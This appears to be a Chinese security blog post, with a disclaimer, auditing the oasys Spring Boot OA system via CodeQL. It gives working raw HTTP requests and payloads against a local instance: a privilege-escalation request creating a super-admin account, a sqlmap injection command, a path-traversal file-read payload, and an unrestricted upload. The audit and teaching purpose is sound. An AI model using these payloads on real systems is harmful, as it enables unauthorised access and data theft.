@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Yu9">
+    
+    <title>
+        
+            半自动化代码审计实战 |
+        
+        Yu9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/blog/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/blog/images/logo.png">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/brands.min.css">
+    
+        
+            
+                
+<link rel="stylesheet" href="/blog/css/custom.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"wsyu9a.github.io","root":"/blog/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#999999","title":"Yu9's Blog","author":"Yu9","avatar":"/images/avatar.png","logo":"/images/logo.png","favicon":"/images/logo.png"},"menu":{"Home":"/","Archives":"/archives","Tags":"/tags","About":"/about"},"first_screen":{"enable":true,"background_img":"/images/bgc.png","background_img_dark":"/images/bgc.png","description":"Runtime.getRuntime().exec(\"变有钱\")","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/wsYu9a","weixin":"img | /images/wechat.jpg"}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"category":false,"tag":true,"announcement":null},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2023,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":true,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":true,"css":["/css/custom.css"]},"root":"/blog","source_data":{},"version":"4.1.0"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/blog/">
+                    <img src="/blog/images/logo.png">
+                </a>
+            
+            <a class="site-name border-box" href="/blog/">
+               Yu9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/tags"
+                            >
+                                
+                                标签
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/about"
+                            >
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/tags"
+                    >标签</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/about"
+                    >关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        半自动化代码审计实战
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/blog/images/avatar.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Yu9</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-02-26</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Tue Mar 19 2024 02:59:46 GMT+0000">2024-03-19</span>
+            </span>
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/blog/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.5k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>10 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <p><strong>文章首发于奇安信攻防社区</strong></p>
+<p><strong>链接：</strong><a class="link"   target="_blank" rel="noopener" href="https://forum.butian.net/share/2763" >https://forum.butian.net/share/2763<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在黑盒测试中可能会忽略一些潜在的漏洞和安全问题。而<code>代码审计</code>则可以直接查看代码、深入到代码层面对系统进行全面分析和检查其执行逻辑，从而能够发现那些黑盒测试中难以发现的问题。</p>
+<p>我个人对代码审计最喜欢的方面是其能够扩大漏洞范围。在当前的模块化开发环境中，开发人员经常编写工具类和库来实现代码的复用，简化代码。当在代码审计中发现一个工具类存在漏洞时，调用该工具类的方法都有可能存在相同的漏洞。我们只需追溯<code>工具类调用处</code>，就可以轻松发现多个漏洞。</p>
+<p>有一句话是这么说的”<code>没有绝对安全的系统</code>“，在这里<code>Yu9</code>借用这句话引出一个观点<code>无论我们在手工代码审计中具备多么扎实的技术背景、丰富的经验和敏锐的洞察力，仍然会存在着一些局限性</code>，例如可能会出现疏漏和错误。</p>
+<p>为了克服这些局限性，使用自动化代码审计工具可以快速识别所有可疑漏洞的位置，从而提高审计的效率和准确性。然而，我们也要认识到自动化工具的使用也有一些限制。它们依赖于已知的漏洞模式和规则，并且可能无法完全覆盖所有的漏洞类型。因此，在进行代码审计时，手工审计和自动化工具的结合使用通常是更有效的方法，以确保发现尽可能多的漏洞并提高审计的准确性。</p>
+<h2 id="0x02-声明"><a href="#0x02-声明" class="headerlink" title="0x02 声明"></a>0x02 声明</h2><p><strong>遵纪守法</strong><br>请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。<br>一切未经授权的网络攻击均为违法行为，互联网非法外之地。<br><strong>文章转载</strong><br>转载请联系作者获得授权<br>作者公众号：安服仔Yu9</p>
+<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><h3 id="审计系统"><a href="#审计系统" class="headerlink" title="审计系统"></a>审计系统</h3><p><strong>oasys</strong></p>
+<p>oasys是一个OA办公自动化系统，</p>
+<ul>
+<li>基于springboot框架开发的项目，mysql底层数据库，前端采用freemarker模板引擎，Bootstrap作为前端UI框架。</li>
+<li>集成了jpa、mybatis等框架。</li>
+</ul>
+<p>源码：<a class="link"   target="_blank" rel="noopener" href="https://gitee.com/aaluoxiang/oa_system" >https://gitee.com/aaluoxiang/oa_system<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>由于是springboot项目，直接idea打开，配置一下数据库，Maven加载一下依赖就可以跑起来。</strong></p>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><strong>CodeQL &amp; CodeQLpy</strong></p>
+<p>1）CodeQl</p>
+<p>CodeQL 是一个语义代码分析引擎，它可以扫描发现代码库中的漏洞。使用 CodeQL，可以像对待数据一样查询代码。编写查询条件以查找漏洞的所有变体并处理，同时可以分享个人查询条件。</p>
+<p>CodeQl教程可以参考这位师傅的文章：<a class="link"   target="_blank" rel="noopener" href="https://kiprey.github.io/2020/12/CodeQL-setup/" >https://kiprey.github.io/2020/12/CodeQL-setup/<i class="fas fa-external-link-alt"></i></a></p>
+<p>2）CodeQLpy</p>
+<p>CodeQLpy是一款基于CodeQL实现的自动化代码审计工具</p>
+<p>项目地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/webraybtl/CodeQLpy" >https://github.com/webraybtl/CodeQLpy<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x04-源码扫描"><a href="#0x04-源码扫描" class="headerlink" title="0x04 源码扫描"></a>0x04 源码扫描</h2><p>使用CodeQLpy工具扫描源码。</p>
+<p>1）初始化数据库，这里直接通过源码来生成数据库，所以不需要-c参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python main.py -t D:\Desktop\oa_system-master</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b42a007.png"  alt="image-20240131011041888"></p>
+<p>2）生成数据库，如果有错请忽略，最终只要看到“成功创建数据库”就可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create out/database/oa_system-master --language=java --source-root=&quot;D:\Desktop\oa_system-master&quot; --command=&quot;D:\Desktop\CodeQLpy-master\out\decode/run.cmd&quot; --overwrite</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b5256f9.png"  alt="image-20240131011425604"></p>
+<p>3）查询漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python main.py -d D:\Desktop\CodeQLpy-master\out\database\oa_system-master</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b61497d.png"  alt="image-20240131011656603"></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b93d5406406.png"  alt="image-20240131021755851"></p>
+<p>4）最终的会生成：csv文件，路径<code>CodeQLpy-master\out\result</code></p>
+<p>可以看到结果还是很清晰的</p>
+<p>Source：漏洞关键字</p>
+<p>SourceFunction：漏洞所在的方法名</p>
+<p>SourcePath：漏洞所在文件地址</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b93de5c3ced.png"  alt="image-20240131022021631"></p>
+<h2 id="0x05-漏洞分析"><a href="#0x05-漏洞分析" class="headerlink" title="0x05 漏洞分析"></a>0x05 漏洞分析</h2><h3 id="01、硬编码、越权组合漏洞获得超级管理员权限"><a href="#01、硬编码、越权组合漏洞获得超级管理员权限" class="headerlink" title="01、硬编码、越权组合漏洞获得超级管理员权限"></a>01、硬编码、越权组合漏洞获得超级管理员权限</h3><p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b954bf5cfce.png"  alt="image-20240131035751829"></p>
+<p>这块已经给了有风险的代码<code>地址和方法名</code>，快速的定位漏洞点。这里咱全局搜索（ctrl+shift+f）</p>
+<p>全局搜索<code>123456</code>，定位到<code>oa_system-master\src\main\java\cn\gson\oasys\controller\user\UserController.java</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b6c7bfb.png"  alt="image-20240131012133698"></p>
+<p>阅读代码得知，这个控制器是初始化用户的功能，给了一个默认密码123456</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b7b90c7.png"  alt="image-20240131013746637"></p>
+<p>寻找后发现是在用户管理模块的新增功能</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b898aea.png"  alt="image-20240131014119460"></p>
+<p>新增用户抓取数据包</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b961b28.png"  alt="image-20240131014551587"></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945ba54c26.png"  alt="image-20240131014723901"></p>
+<p>登录一个普通用户的账号、可以看到这个用户是没有<code>用户管理</code>这个功能的。</p>
+<p>抓取他的session</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945bb5f2c5.png"  alt="image-20240131013042054"></p>
+<p>替换掉这个数据包中的session。注意：身份证格式要规范，我用的自己的就不展示了。</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945bcdf9c3.png"  alt="image-20240131014801196"></p>
+<p>使用这个数据包的话要修改身份证哈-<code>idCard</code>参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /useredit HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Sec-Fetch-Dest: iframe</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Referer: http://127.0.0.1/useredit</span><br><span class="line">Cookie: JSESSIONID=CA902F7BBA9E186241CC19593B034F47</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Google Chrome&quot;;v=&quot;120&quot;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">Content-Length: 317</span><br><span class="line"></span><br><span class="line">userName=test&amp;userTel=14444444444&amp;realName=%E5%BC%A0%E4%B8%89&amp;eamil=14444444444%40qq.com&amp;address=%E6%B2%B3%E5%8D%97&amp;userEdu=%E6%9C%AC%E7%A7%91&amp;school=%E9%83%91%E5%A4%A7&amp;idCard=xxxxxxxxxxxxxxxxxx&amp;bank=62175555555555433&amp;deptid=1&amp;sex=%E7%94%B7&amp;positionid=1&amp;roleid=3&amp;salary=1000&amp;hireTime=2024-01-30&amp;themeSkin=blue&amp;userId=</span><br></pre></td></tr></table></figure>
+
+<p>成功创建用户，并且具有超级管理员权限</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945bda4a33.png"  alt="image-20240131013126951"></p>
+<h3 id="02、sql注入"><a href="#02、sql注入" class="headerlink" title="02、sql注入"></a>02、sql注入</h3><p>可以看到有三个可以漏洞点都在<code>AddrController</code>类，先办它！</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b94074450d6.png"  alt="image-20240131023116507"></p>
+<p>这块是直接给出了有风险的代码位置<code>oa_system-master/src/main/java/cn/gson/oasys/controller/address/AddrController.java</code>和方法名<code>outAddress</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b9404e6453c.png"  alt="image-20240131023037815"></p>
+<p>可以看到调用了am的allDirector方法来处理<code>baseKey</code>，我们跟进去（ctrl+鼠标左键点击方法名）瞅瞅</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945be3b184.png"  alt="image-20240131015857588"></p>
+<p>然后就调用了数据库，这个系统使用的是mybatis，咱直接点代码前的小红鸟，跟进到xml文件瞅瞅具体的sql语句</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b946614ba70.png"  alt="image-20240131025633296"></p>
+<p>mybatis在对sql语句进行预处理时：<code>#&#123;&#125;</code> 进行预处理、<code>$&#123;&#125;</code> 不进行预处理。这块在处理baseKey参数就是使用${}直接拼接。同时pinyin、outtype参数也是如此、也是拼接，也可以注入</p>
+<p>找到功能点测试发现baseKey参数就是<code>外部通讯录</code>模块搜索功能的参数</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/29/65b7433ce6225.png"  alt="image-20240129141836472"></p>
+<p>抓数据包</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b9464969e32.png"  alt="image-20240131025609200"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /outaddresspaging HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Cookie: JSESSIONID=ED297E0C1F3E70B122CEEEA3481786D7</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Referer: http://127.0.0.1/addrmanage</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Google Chrome&quot;;v=&quot;120&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: text/html, */*; q=0.01</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">alph=ALL&amp;outtype=&amp;baseKey=qwe</span><br></pre></td></tr></table></figure>
+
+<p>保存数据包到txt文件，使用sqlmap一把梭，命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r “oasys.txt” -v 3 -level=5</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/29/65b7442f7b72e.png"  alt="image-20240129142239166"></p>
+<p>剩下还有一个可以sql注入的功能在<strong>通知列表</strong>、审计方法相同这就贴几张图不细说了</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b93fde585bf.png"  alt="image-20240131022845828"></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/29/65b73906306eb.png"  alt="image-20240129133501697"></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/29/65b7386ed8fb1.png"  alt="image-20240129133230547"></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/29/65b739747c511.png"  alt="image-20240129133652095"></p>
+<h3 id="03、任意文件读取"><a href="#03、任意文件读取" class="headerlink" title="03、任意文件读取"></a>03、任意文件读取</h3><p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b941321b7e9.png"  alt="image-20240131023426210"></p>
+<p>这块有俩其实都一样，咱就挑一个分析就OK</p>
+<p>这块是直接给出了有风险的代码位置<code>oa_system-master/src/main/java/cn/gson/oasys/controller/user/UserpanelController.java</code>方法名<code>image</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b941b3b3ac7.png"  alt="image-20240131023635884"></p>
+<p>projectPath：当前项目路径</p>
+<p>startpath：获取请求URI</p>
+<p>这块唯一的处理就是把URI中的<code>/images</code>替换为空，之后就创建<code>file</code>对象</p>
+<p>也没有对文件内容做啥检测就输出了</p>
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/image//image..//image..//image..//image..//image..//image../test.txt</span><br></pre></td></tr></table></figure>
+
+<p>新建一个测试文件</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b943675e214.png"  alt="image-20240131024350969"></p>
+<p>成功读取到桌面文件</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b9450b63fcd.png"  alt="image-20240131025051402"></p>
+<p>具体的payload还要看自己在配置文件中的<code>rootpath</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945a63193d.png"  alt="image-20240131025325982"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">GET /image//image..//image..//image..//image..//image..//image../test.txt HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Google Chrome&quot;;v=&quot;120&quot;</span><br><span class="line">Cookie: JSESSIONID=ED297E0C1F3E70B122CEEEA3481786D7</span><br><span class="line">Referer: http://127.0.0.1/addrmanage</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Accept: text/html, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="04、文件上传"><a href="#04、文件上传" class="headerlink" title="04、文件上传"></a>04、文件上传</h3><p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b948270eae4.png"  alt="image-20240131030407154"></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b9483ce28ef.png"  alt="image-20240131030429057"></p>
+<p>这里提到最多的还是文件上传，我们找一个跟进去看看</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b948b794156.png"  alt="image-20240131030631749"></p>
+<p>通过审计我们可以看到这块确实没有对文件后缀进行一些过滤。导致任意文件上传</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b949a047369.png"  alt="image-20240131031024684"></p>
+<p>但是作者这块使用uuid重新生成了文件名，并且上传文件存在静态文件夹。并且不会返回文件路径。so目前貌似没有危害</p>
+<p>若我们可以找到文件包含这类漏洞并且得知文件名则可以getshell。</p>
+<p><strong>深入：</strong></p>
+<p>抱着不漏掉的原则，就又看了看其他的上传点。发现一个上传头像处回显地址</p>
+<p>漏洞地址：<code>oa_system-master/src/main/java/cn/gson/oasys/services/user/NotepaperService.java</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b95634b57c5.png"  alt="image-20240131040404783"></p>
+<p>是一个<code>services</code>，那就向上追溯寻找调用处</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b958e0afc76.png"  alt="image-20240131041528902"></p>
+<p>在系统中找到位置在用户面板中个人设置处</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b95a324cba4.png"  alt="image-20240131042106283"></p>
+<p>使用刚刚越权创建的账号test上传一个js或者pdf文件，咱就直接用js</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b95ac1ad656.png"  alt="image-20240131042329889"></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b95b0f5b20a.png"  alt="image-20240131042447042"></p>
+<p>之后再用户管理处就可以看到src中是文件地址。</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b959dacefba.png"  alt="image-20240131041938816"></p>
